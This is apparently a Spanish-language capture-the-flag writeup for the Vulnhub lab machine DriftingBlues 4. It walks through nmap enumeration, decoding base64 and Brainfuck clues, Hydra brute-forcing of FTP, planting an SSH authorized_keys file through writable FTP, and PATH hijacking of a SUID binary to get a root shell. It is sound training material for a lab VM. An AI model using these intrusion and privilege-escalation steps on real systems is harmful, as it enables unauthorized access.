---
title: DriftingBlues 4 Writeup - Vulnhub
date: 2025-01-24
categories: [Writeups, Vulnhub]
tags: [Linux, Vulnhub, CTF, Easy, HTTP, DriftingBlues, Hydra, Brainfuck, QRScanner]
image:
  path: /assets/img/commons/vulnhub/vulnhub.jpg
---

Resolución máquina anterior: [**DriftingBlues3**](https://lvs3c.github.io/posts/DriftingBlues-3/)

¡Saludos!

En este writeup, nos adentraremos en la primer máquina [**DriftingBlues4**](https://www.vulnhub.com/entry/driftingblues-4,661/), la cual tiene un nivel de dificultad **fácil** según la plataforma. Se trata de una máquina **Linux** en la cual veremos **enumeración de servicios**, **Desencriptar cadena base64 - código Brainfuck**, utilizamos **QRScanner** para analizar un QR, **Hydra** para fuerta bruta del servicio `FTP`{: .filepath} y luego cargar nuestra clave pública SSH, **SSH** para conectarnos a la máquina víctima y utilizaremos **PATH Hijacking** para elevar nuestros privilegios como usuario **root**, obteniendo así las flags del CTF.

¡Empecemos!

## Reconocimiento activo

---

Necesitamos encontrar la ip correspondiente a la máquina, lo hacemos mediante la herramienta `arp-scan` y posteriormente el comando `ping` para verificar si la máquina objetivo está activa.

```bash
❯ arp-scan -I ens32 --localnet --ignoredups
Interface: ens32, type: EN10MB, MAC: 00:0c:29:c4:47:79, IPv4: 10.11.12.10
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.11.12.1      00:50:56:c0:00:01       VMware, Inc.
10.11.12.34     00:0c:29:17:b9:98       VMware, Inc.
10.11.12.254    00:50:56:f6:71:b0       VMware, Inc.

3 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.383 seconds (107.43 hosts/sec). 3 responded
```

```bash
❯ ping -c 1 10.11.12.34
PING 10.11.12.34 (10.11.12.34) 56(84) bytes of data.
64 bytes from 10.11.12.34: icmp_seq=1 ttl=64 time=0.729 ms

--- 10.11.12.34 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.729/0.729/0.729/0.000 ms
```

## Escaneo

---

A continuación, realizamos un escaneo con `Nmap` para identificar los puertos abiertos en el sistema objetivo.

```bash
❯ nmap -p- --open -sS --min-rate 5000 -n -Pn 10.11.12.34 -oG nmap_ports
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-26 14:47 -03
Nmap scan report for 10.11.12.34
Host is up (0.0022s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
MAC Address: 00:0C:29:17:B9:98 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 5.66 seconds
```

## Enumeración

---

Seguidamente, efectuamos una enumeración de las versiones de los servicios asociados a los puertos abiertos. Además, ejecutamos un conjunto de scripts predeterminados de `Nmap` para realizar pruebas complementarias sobre los puertos y servicios identificados.

```bash
❯ nmap -p21,22,80 -sCV 10.11.12.34 -oN nmap_services
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-26 14:48 -03
Stats: 0:01:06 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
Nmap scan report for 10.11.12.34
Host is up (0.00031s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp
| fingerprint-strings:
|   GenericLines:
|     220 ProFTPD Server (driftingblues) [::ffff:10.11.12.34]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 6a:fe:d6:17:23:cb:90:79:2b:b1:2d:37:53:97:46:58 (RSA)
|   256 5b:c4:68:d1:89:59:d7:48:b0:96:f3:11:87:1c:08:ac (ECDSA)
|_  256 61:39:66:88:1d:8f:f1:d0:40:61:1e:99:c5:1a:1f:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.94SVN%I=7%D=1/26%Time=67967573%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,95,"220\x20ProFTPD\x20Server\x20\(driftingblues\)\x20\[::ff
SF:ff:10\.11\.12\.33\]\r\n500\x20Invalid\x20command:\x20try\x20being\x20mo
SF:re\x20creative\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x2
SF:0creative\r\n");
MAC Address: 00:0C:29:17:B9:98 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 73.83 seconds

```

El informe de `Nmap` nos revela:
- Puerto `21` servidor `ProFTPD`
- Puerto `22` servidor `OpenSSH 7.9p1`
- Puerto `80` servidor `Apache 2.4.38`.


### FTP - 21

Intentamos loguearnos por FTP como `anonymous`, pero sin éxito.

```bash
❯ ftp 10.11.12.34
Connected to 10.11.12.34.
220 ProFTPD Server (driftingblues) [::ffff:10.11.12.34]
Name (10.11.12.34:lv): anonymous
331 Password required for anonymous
Password:
530 Login incorrect.
ftp: Login failed
```

### HTTP - 80

Hacemos un análisis de la web con `whatweb` para ver su tecnología.

```bash
❯ whatweb http://10.11.12.34/
http://10.11.12.34/ [200 OK] Apache[2.4.38], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.38 (Debian)], IP[10.11.12.34]
```

Verificamos la web y su código.

![web](/assets/img/commons/vulnhub/DriftingBlues4/web.png){: .center-image }

Verificando el código de la web, nos encontramos con una cadena en base64, la cual nos revela un path de un archivo.

```bash
❯ echo Z28gYmFjayBpbnRydWRlciEhISBkR2xuYUhRZ2MyVmpkWEpwZEhrZ1pISnBjSEJwYmlCaFUwSnZZak5DYkVsSWJIWmtVMlI1V2xOQ2FHSnBRbXhpV0VKellqTnNiRnBUUWsxTmJYZ3dWMjAxVjJGdFJYbGlTRlpoVFdwR2IxZHJUVEZOUjFaSlZWUXdQUT09 | base64 -d; echo
go back intruder!!! dGlnaHQgc2VjdXJpdHkgZHJpcHBpbiBhU0JvYjNCbElIbHZkU2R5WlNCaGJpQmxiWEJzYjNsbFpTQk1NbXgwV201V2FtRXliSFZhTWpGb1drTTFNR1ZJVVQwPQ==
❯ echo dGlnaHQgc2VjdXJpdHkgZHJpcHBpbiBhU0JvYjNCbElIbHZkU2R5WlNCaGJpQmxiWEJzYjNsbFpTQk1NbXgwV201V2FtRXliSFZhTWpGb1drTTFNR1ZJVVQwPQ== | base64 -d; echo
tight security drippin aSBob3BlIHlvdSdyZSBhbiBlbXBsb3llZSBMMmx0Wm5WamEybHVaMjFoWkM1MGVIUT0=
❯ echo aSBob3BlIHlvdSdyZSBhbiBlbXBsb3llZSBMMmx0Wm5WamEybHVaMjFoWkM1MGVIUT0= | base64 -d; echo
i hope you're an employee L2ltZnVja2luZ21hZC50eHQ=
❯ echo L2ltZnVja2luZ21hZC50eHQ= | base64 -d; echo
/imfuckingmad.txt
```

Verificamos el archivo y nos encontramos con una cadena la cual está escrita en el lenguaje de programación `Brainfuck`.

![imfuckingmad](/assets/img/commons/vulnhub/DriftingBlues4/imfuckingmad.png){: .normal }

Utilizamos el siguiente recurso web [Cachesleuth](https://www.cachesleuth.com/bfook.html) para desencriptar el código.

![cacheleuth1](/assets/img/commons/vulnhub/DriftingBlues4/cacheleuth1.png){: .normal }
![cacheleuth2](/assets/img/commons/vulnhub/DriftingBlues4/cacheleuth2.png){: .normal }

Nos dirigimos a la imágen y es un código QR, utilizamos `qrscanner`{: .filepath} para desencriptar el contenido.

![iTiS3Cr3TbiTCh](/assets/img/commons/vulnhub/DriftingBlues4/iTiS3Cr3TbiTCh.png){: .normal }

```bash
❯ qrscanner iTiS3Cr3TbiTCh.png
╔═════════════════════════════════════╗
║                                     ║
║   https://i.imgur.com/a4JjS76.png   ║
║                                     ║
╚═════════════════════════════════════╝
```

![qr_result](/assets/img/commons/vulnhub/DriftingBlues4/qr_result.png){: .normal }

El resultado nos brinda usuarios, los cuales guardaremos para una futura fuerza bruta.

Por el momento, vamos a continuar realizando un fuzzing de directorios rápido con el script `http-enum` de nmap.

```bash
❯ nmap -p80 --script http-enum 10.11.12.34 -oN nmap_webscan
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-26 15:28 -03
Nmap scan report for 10.11.12.34
Host is up (0.00041s latency).

PORT   STATE SERVICE
80/tcp open  http
MAC Address: 00:0C:29:17:B9:98 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 7.17 seconds
```

No nos trajo información, intentamos con `gobuster` fuzzing más en detalle pero sin nada relevante.

## Explotación

---

Vamos a probar fuerza bruta con `Hydra` sobre el servicio `FTP` que nos pedía usuario y clave, el servicio SSH necesita un certificado.

```bash
❯ hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 10.11.12.34 ftp -t 10
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-28 10:10:52
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 10 tasks per 1 server, overall 10 tasks, 57377596 login tries (l:4/p:14344399), ~5737760 tries per task
[DATA] attacking ftp://10.11.12.34:21/
[STATUS] 100.00 tries/min, 100 tries in 00:01h, 57377496 to do in 9562:55h, 10 active
[STATUS] 103.33 tries/min, 310 tries in 00:03h, 57377286 to do in 9254:25h, 10 active
[STATUS] 106.29 tries/min, 744 tries in 00:07h, 57376852 to do in 8997:16h, 10 active
[STATUS] 106.67 tries/min, 1600 tries in 00:15h, 57375996 to do in 8964:60h, 10 active
[21][ftp] host: 10.11.12.34   login: luther   password: mypics
```

Nos logueamos por FTP con las credenciales obtenidas y listamos su contenido.

```bash
❯ ftp 10.11.12.34
Connected to 10.11.12.34.
220 ProFTPD Server (driftingblues) [::ffff:10.11.12.34]
Name (10.11.12.34:lv): luther
331 Password required for luther
Password:
230 User luther logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||7863|)
150 Opening ASCII mode data connection for file list
drwxrwxrwx   3 root     root         4096 Jan  9  2021 .
drwxrwxrwx   3 root     root         4096 Jan  9  2021 ..
drwxrwxrwx   2 1001     1001         4096 Jan  9  2021 hubert
-rw-r--r--   1 root     root           50 Jan 28 12:12 sync_log
226 Transfer complete
```

El directorio del usuario `hubert` está vacío, pero podemos cargar nuestra clave pública de ssh para conectarnos como dicho usuario, creamos el directorio .ssh y cargamos nuestra clave pública como `authorized_keys`.

```bash
ftp> cd hubert
250 CWD command successful
ftp> ls -la
229 Entering Extended Passive Mode (|||64401|)
150 Opening ASCII mode data connection for file list
drwxrwxrwx   2 1001     1001         4096 Jan  9  2021 .
drwxrwxrwx   3 root     root         4096 Jan  9  2021 ..
226 Transfer complete
ftp> mkdir .ssh
257 "/hubert/.ssh" - Directory successfully created
ftp> cd .ssh
250 CWD command successful
ftp> put id_rsa.pub
local: id_rsa.pub remote: id_rsa.pub
229 Entering Extended Passive Mode (|||36778|)
150 Opening BINARY mode data connection for id_rsa.pub
100% |************************************************************************************|   563        8.80 MiB/s    00:00 ETA
226 Transfer complete
563 bytes sent in 00:00 (844.55 KiB/s)
ftp> ls
229 Entering Extended Passive Mode (|||51501|)
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 luther   luther        563 Jan 28 12:12 id_rsa.pub
226 Transfer complete
ftp> rename id_rsa.pub authorized_keys
350 File or directory exists, ready for destination name
250 Rename successful
ftp> ls
229 Entering Extended Passive Mode (|||41199|)
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 luther   luther        563 Jan 28 12:12 authorized_keys
226 Transfer complete
ftp>
```

Nos conectamos por `ssh`.

```bash
❯ ssh hubert@10.11.12.34 -i ~/.ssh/id_rsa
Linux driftingblues 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
hubert@driftingblues:~$
```

## Escalación de privilegios

---

Listamos la Flag 1.

```bash
hubert@driftingblues:~$ cat user.txt
flag 1/2
░░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄▄
░░░░░█░░░░░░░░░░░░░░░░░░▀▀▄
░░░░█░░░░░░░░░░░░░░░░░░░░░░█
░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█
░▄▀░▄▄▄░░█▀▀▀▀▄▄█░░░██▄▄█░░░░█
█░░█░▄░▀▄▄▄▀░░░░░░░░█░░░░░░░░░█
█░░█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄░█
░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█
░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█
░░░█░░░░██░░▀█▄▄▄█▄▄█▄▄██▄░░█
░░░░█░░░░▀▀▄░█░░░█░█▀█▀█▀██░█
░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█
░░░░░░░▀▄▄░░░░░░░░░░░░░░░░░░░█
░░░░░█░░░░▀▀▄▄░░░░░░░░░░░░░░░█
░░░░▐▌░░░░░░█░▀▄▄▄▄▄░░░░░░░░█
░░███░░░░░▄▄█░▄▄░██▄▄▄▄▄▄▄▄▀
░▐████░░▄▀█▀█▄▄▄▄▄█▀▄▀▄
░░█░░▌░█░░░▀▄░█▀█░▄▀░░░█
░░█░░▌░█░░█░░█░░░█░░█░░█
░░█░░▀▀░░██░░█░░░█░░█░░█
░░░▀▀▄▄▀▀░█░░░▀▄▀▀▀▀█░░█
```

Listando los binario `SUID` observamos el mismo que en la resolución anterior `/usr/bin/getinfo`, con el mismo código.

```bash
hubert@driftingblues:~$ find / -perm -4000 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/bin/passwd
/usr/bin/getinfo
/usr/bin/mount
/usr/bin/chfn
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/chsh
```

Podemos elevar nuestro privilegio realizando un `PATH Hijacking`.

Listamos la flag 2.

```bash
hubert@driftingblues:~$ cd /tmp/
hubert@driftingblues:/tmp$ export PATH=/tmp/:$PATH
hubert@driftingblues:/tmp$ echo '/bin/bash' > ip
hubert@driftingblues:/tmp$ chmod +x ip
hubert@driftingblues:/tmp$ /usr/bin/getinfo
###################
ip address
###################

root@driftingblues:/tmp# cd /root
root@driftingblues:/root# cat root.txt
flag 2/2
░░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄▄
░░░░░█░░░░░░░░░░░░░░░░░░▀▀▄
░░░░█░░░░░░░░░░░░░░░░░░░░░░█
░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█
░▄▀░▄▄▄░░█▀▀▀▀▄▄█░░░██▄▄█░░░░█
█░░█░▄░▀▄▄▄▀░░░░░░░░█░░░░░░░░░█
█░░█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄░█
░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█
░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█
░░░█░░░░██░░▀█▄▄▄█▄▄█▄▄██▄░░█
░░░░█░░░░▀▀▄░█░░░█░█▀█▀█▀██░█
░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█
░░░░░░░▀▄▄░░░░░░░░░░░░░░░░░░░█
░░▐▌░█░░░░▀▀▄▄░░░░░░░░░░░░░░░█
░░░█▐▌░░░░░░█░▀▄▄▄▄▄░░░░░░░░█
░░███░░░░░▄▄█░▄▄░██▄▄▄▄▄▄▄▄▀
░▐████░░▄▀█▀█▄▄▄▄▄█▀▄▀▄
░░█░░▌░█░░░▀▄░█▀█░▄▀░░░█
░░█░░▌░█░░█░░█░░░█░░█░░█
░░█░░▀▀░░██░░█░░░█░░█░░█
░░░▀▀▄▄▀▀░█░░░▀▄▀▀▀▀█░░█

congratulations!
```

Hope it helps!